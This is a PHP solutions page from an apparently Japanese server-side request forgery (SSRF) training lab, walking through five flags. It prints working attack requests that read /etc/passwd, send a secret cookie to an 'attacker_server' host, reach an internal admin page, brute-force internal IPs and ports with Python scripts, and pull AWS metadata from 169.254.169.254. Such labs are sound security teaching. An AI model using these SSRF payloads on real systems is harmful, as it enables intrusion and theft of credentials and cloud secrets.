<?php
if (!file_exists('/tmp/test.db')) {
    header("Location: /index.php");
    exit;
} 
?>
<html>
<head>
<?php include("header.php"); ?>
</head>
<body>
<?php include("nav.php"); ?>
<div class="container">
<div class="mt-5 pb-2">
    <form action="solutions.php" method="post">
        <div class="form-group">
            <label for="level">答え合わせやどうしても解けない場合は、こちらの解法をご覧ください。</label>
            <select class="form-control" id="level" name="solution">
                <option value="1">FLAG 1</option>
                <option value="2">FLAG 2</option>
                <option value="3">FLAG 3</option>
                <option value="4">FLAG 4</option>
                <option value="5">FLAG 5</option>
                
            </select>
        </div>
        <button type="submit" class="btn btn-primary mb-2">解法を見る</button>
    </form>

    <?php if(isset($_POST['solution'])):?>
        <?php if($_POST['solution'] === "1"): ?>
            <p>ファイルアップロードは試しましたか？<br />
            アップロードの確認時のパラメータに注目してください。<br />
            アップロード時のパラメータ<code>tmp_file_path</code>を<code>/etc/passwd</code>に改ざんしてみましょう。</p>
            <pre class="codepre">
POST /upload.php HTTP/1.1
Host: localhost:1443
Connection: close
Content-Length: 35
Origin: https://localhost:1443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;
Referer: https://localhost:1443/confirm.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

pid=1&tmp_file_path=%2Fetc%2Fpasswd</pre>
            <p>エクスポートでユーザリストをダウンロードしてください。<code>/etc/passwd</code>の内容が取得できていることが確認できます。</p>
            <code>FLAG_A7D3C0BA0F:x:1000:1000::/home/FLAG_A7D3C0BA0F:/sbin/nologin</code>
        <?php elseif($_POST['solution'] === "2"): ?>
            <p>攻撃者サーバにリクエストさせ、そのリクエストの中身を見てみましょう<br />
            docker内部から攻撃者サーバにリクエストさせる場合は<code>http://attacker_server:8888</code>を指定する必要があります。
            <pre class="codepre">
POST /upload.php HTTP/1.1
Host: localhost:1443
Connection: close
Content-Length: 51
Origin: https://localhost:1443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;
Referer: https://localhost:1443/confirm.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

pid=1&tmp_file_path=http%3a//attacker_server%3a8888</pre>
            <p>攻撃者サーバのログを確認してください。<a href="http://localhost:8888/view-log">http://localhost:8888/view-log</a>で確認できます。</p>
            <pre class="codepre">
INFO:root:GET request,
Path: /
Headers:
Host: attacker_server:8888
Connection: close
Cookie: secret=FLAG_9E96EBD40C</pre>
            
        <?php elseif($_POST['solution'] === "3"): ?>
            <p>管理者ページ(<code>https://<?= $_SERVER['SERVER_ADDR'] ?>:1443/admin.php</code>)は、docker内部ネットワーク(<code>1.1.1.0/29</code>)からのアクセスのみ許可されています。<br />ブラウザからはアクセスできないため、SSRFを悪用して、内部ネットワーク経由でアクセスした情報を盗み見ることが可能です。</p>
            <p>内部ネットワーク側で振られているサーバのIPアドレスが分からない場合は、<code>1.1.1.0/29</code>で利用可能なホストアドレスを総当たりし、レスポンスが取得できるIPアドレスを探しましょう。</p>

            <pre class="codepre">
POST /upload.php HTTP/1.1
Host: localhost:1443
Connection: close
Content-Length: 51
Origin: https://localhost:1443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;
Referer: https://localhost:1443/confirm.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

pid=1&tmp_file_path=https://<?= $_SERVER['SERVER_ADDR'] ?>:1443/admin.php</pre>
            <p>その後、エクスポートでユーザリストをダウンロードしてください。管理者ページの内容が取得できていることが確認できます。</p>
            <pre class="codepre">
10,&lt;p&gt;Congratilation!&lt;/p&gt;,
11,"&lt;p&gt;FLAG is FLAG_3488619AE9&lt;/p&gt;",</pre>
            </div>
        <?php elseif($_POST['solution'] === "4"): ?>
            <p>内部ネットワーク内に存在するホストを探し出します。<br />
            総当たりを行う場合、BurpであればIntruderを使うのが簡単です。<br />
            そのようなツールがない場合や使用できない場合は、スクリプトを作成する必要があります。ここではPython3系で確認します。</p>
            <pre class="codepre">
import requests, urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
 
url = "https://localhost:1443/upload.php"
target_path = "https://1.1.1.{}"
params = {
    "pid":1,
    "tmp_file_path":""
}

for ip in range(1,8):
    params["tmp_file_path"] = target_path.format(ip)
    r = requests.post(url, data=params, verify=False, allow_redirects=False)
    print("[{}] code: {}, length: {}".format(target_path.format(ip), r.status_code, len(r.text)))</pre>
            <p>このスクリプトはSSRFを悪用して<code>https://1.1.1.1 ~ https://1.1.1.7</code>までをチェックします。レスポンスの違いを見たいため、レスポンスボディの長さを比較しています。</p>
            <p>結果:</p>
            <pre class="codepre">
[https://1.1.1.1] code: 200, length: 15
[https://1.1.1.2] code: 200, length: 15
[https://1.1.1.3] code: 302, length: 0
[https://1.1.1.4] code: 200, length: 15
[https://1.1.1.5] code: 200, length: 15
[https://1.1.1.6] code: 200, length: 15
[https://1.1.1.7] code: 200, length: 15</pre>
            <p><code>https://1.1.1.3</code>だけレスポンスがなく、ステータスコードも<code>302</code>です。これはSSRFによるリクエストが成功し、レスポンスを受け取っていることを意味します。<br />
            <p>エクスポートでユーザリストをダウンロードし、結果を確認します。</p>
            <pre class="codepre">
100,HTTPSは未対応です,</pre>
            <p>HTTPS未対応とのことなので、<code>target_path = "http://1.1.1.{}"</code>に変更して再度リクエストを送り、エクスポートを行って結果を確認します。</p>
            <pre class="codepre">
101,"It works! &lt;!-- セキュリティ観点からポート変更。80-90番台のポートを使用できるよう社内調整しておきました。--&gt;",</pre>
            <p>ポートも変わっているようです。IPアドレスは分かっているため、今度はポートを総当たりできるようにプログラムを変えます。
            <pre class="codepre">
import requests, urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)
 
url = "https://localhost:1443/upload.php"
target_port = "http://1.1.1.3:{}"
params = {
    "pid":1,
    "tmp_file_path":""
}

for port in range(80,99):
    params["tmp_file_path"] = target_port.format(port)
    r = requests.post(url, data=params, verify=False, allow_redirects=False)
    print("[{}] code: {}, length: {}".format(target_port.format(port), r.status_code, len(r.text)))</pre>
            <p>結果:</p>
            <pre class="codepre">
[http://1.1.1.3:80] code: 302, length: 0
[http://1.1.1.3:81] code: 200, length: 15
[http://1.1.1.3:82] code: 200, length: 15
[http://1.1.1.3:83] code: 200, length: 15
[http://1.1.1.3:84] code: 200, length: 15
[http://1.1.1.3:85] code: 200, length: 15
[http://1.1.1.3:86] code: 200, length: 15
[http://1.1.1.3:87] code: 200, length: 15
[http://1.1.1.3:88] code: 302, length: 0
[http://1.1.1.3:89] code: 200, length: 15
[http://1.1.1.3:90] code: 200, length: 15
[http://1.1.1.3:91] code: 200, length: 15
[http://1.1.1.3:92] code: 200, length: 15
[http://1.1.1.3:93] code: 200, length: 15
[http://1.1.1.3:94] code: 200, length: 15
[http://1.1.1.3:95] code: 200, length: 15
[http://1.1.1.3:96] code: 200, length: 15
[http://1.1.1.3:97] code: 200, length: 15
[http://1.1.1.3:98] code: 200, length: 15</pre>
            <p><code>http://1.1.1.3:88</code>だけレスポンスがなく、ステータスコードも<code>302</code>です。<br />
            エクスポートでユーザリストをダウンロードし、結果を確認します。</p>
            <pre class="codepre">
703,"&lt;p&gt;Welcome to Internal Web Server!&lt;/p&gt;",
704,"&lt;p&gt; FLAG is FLAG_726C6BEDAE&lt;/p&gt;",</pre>

        <?php elseif($_POST['solution'] === "5"): ?>
            <p>クラウドのメタデータを探します。<br />
            クラウドベンダーごとにクラウドメタデータのAPIエンドポイントは異なります。<br />
            <a href="https://localhost:1443/about.php">about</a>ページの参考情報にAPIエンドポイントのリストページをリンクしているので参考にしてください。</p>
            <p>AWSのクラウドメタデータにアクセスできるか確認します。</p>
            <pre class="codepre">
POST /upload.php HTTP/1.1
Host: localhost:1443
Connection: close
Content-Length: 51
Origin: https://localhost:1443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;
Referer: https://localhost:1443/confirm.php
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

pid=1&tmp_file_path=http%3a//169.254.169.254/latest/meta-data/user-data</pre>
            <p>その後、エクスポートでユーザリストをダウンロードしてください。クラウドメタデータの内容が取得できていることが確認できます。</p>
            <pre class="codepre">
53,FLAG_0F363AF467,</pre>
            <div class="bd-callout bd-callout-info">
                <p class="mb-0">メタデータの取得確認までを目的としているため、user-data以外のファイルの中身も全て同一のFLAGにしています。</p>
            </div>
            </div>
        <?php endif ?>
    <?php endif ?>
</div>
</div>
</body>
</html>